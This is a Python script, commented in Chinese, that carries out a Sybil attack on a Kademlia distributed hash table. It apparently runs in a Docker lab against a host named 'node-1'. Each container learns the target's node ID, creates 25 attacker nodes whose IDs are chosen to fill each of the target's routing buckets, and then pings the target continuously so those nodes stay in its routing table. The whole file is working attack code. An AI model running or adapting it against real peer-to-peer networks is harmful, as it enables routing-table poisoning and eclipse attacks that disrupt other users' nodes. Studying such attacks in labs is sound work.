"""
单个女巫节点脚本 - 配合docker-compose-sybil.yml使用
每个容器运行此脚本，创建一部分攻击节点
"""
import asyncio
import logging
import random
import socket
import sys
from kademlia.node import Node
from kademlia.utils import ID_BITS

TARGET_HOSTNAME = "node-1"
TARGET_PORT = 8000
NODES_PER_CONTAINER = 25  # 每个容器创建25个节点
START_PORT = 9000

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(name)s] %(message)s')
logger = logging.getLogger(f"SybilContainer")


async def get_target_id(target_ip, target_port):
    """获取目标节点ID"""
    logger.info("?? Getting target ID...")
    recon_node = Node(random.getrandbits(32), START_PORT - 1)
    await recon_node.start()
    
    target_contact = {'id': 0, 'ip': target_ip, 'port': target_port}
    is_alive = await recon_node.protocol.ping(target_contact)
    
    target_id = None
    if is_alive:
        for bucket in recon_node.routing_table.buckets:
            for contact in bucket:
                if contact['ip'] == target_ip and contact['port'] == target_port:
                    target_id = contact['id']
                    break
            if target_id:
                break
    
    if recon_node.protocol.transport:
        recon_node.protocol.transport.close()
    
    return target_id


def generate_targeted_id(target_id, bit_index):
    """生成针对特定bucket的节点ID"""
    prefix_mask = (1 << bit_index)
    if bit_index > 0:
        noise = random.getrandbits(bit_index)
    else:
        noise = 0
    return target_id ^ prefix_mask ^ noise


async def create_sybil_node(node_id, port):
    node = Node(node_id, port)
    await node.start()
    return node


async def run_container_attack(container_id):
    """每个容器的攻击逻辑"""
    logger.info(f"? Container #{container_id} starting attack")
    
    # 解析目标
    try:
        target_ip = socket.gethostbyname(TARGET_HOSTNAME)
        logger.info(f"? Target: {target_ip}:{TARGET_PORT}")
    except Exception as e:
        logger.error(f"? DNS error: {e}")
        return
    
    # 获取目标ID
    target_id = await get_target_id(target_ip, TARGET_PORT)
    if not target_id:
        logger.error("? Failed to get target ID")
        return
    
    logger.info(f"? Target ID: {target_id:08x}")
    
    # 每个容器生成部分节点
    sybils = []
    current_port = START_PORT
    
    for i in range(NODES_PER_CONTAINER):
        # 分布到不同的bucket
        bucket_idx = (container_id * NODES_PER_CONTAINER + i) % ID_BITS
        attack_id = generate_targeted_id(target_id, bucket_idx)
        
        node = await create_sybil_node(attack_id, current_port)
        sybils.append(node)
        current_port += 1
        
        if len(sybils) % 10 == 0:
            await asyncio.sleep(0.05)
    
    logger.info(f"? Container #{container_id} deployed {len(sybils)} nodes")
    
    # 获取本容器的真实IP
    my_ip = socket.gethostbyname(socket.gethostname())
    logger.info(f"? My IP: {my_ip} (真实IP，无法伪造)")
    
    target_contact = {'id': target_id, 'ip': target_ip, 'port': TARGET_PORT}
    
    # 维护循环
    while True:
        for node in sybils:
            try:
                asyncio.create_task(node.protocol.ping(target_contact))
            except Exception:
                pass
        
        logger.info(f"? Container #{container_id} heartbeat ({len(sybils)} nodes)")
        await asyncio.sleep(20)


if __name__ == '__main__':
    container_id = int(sys.argv[1]) if len(sys.argv) > 1 else 0
    
    try:
        asyncio.run(run_container_attack(container_id))
    except KeyboardInterrupt:
        logger.info(f"Container #{container_id} stopped")
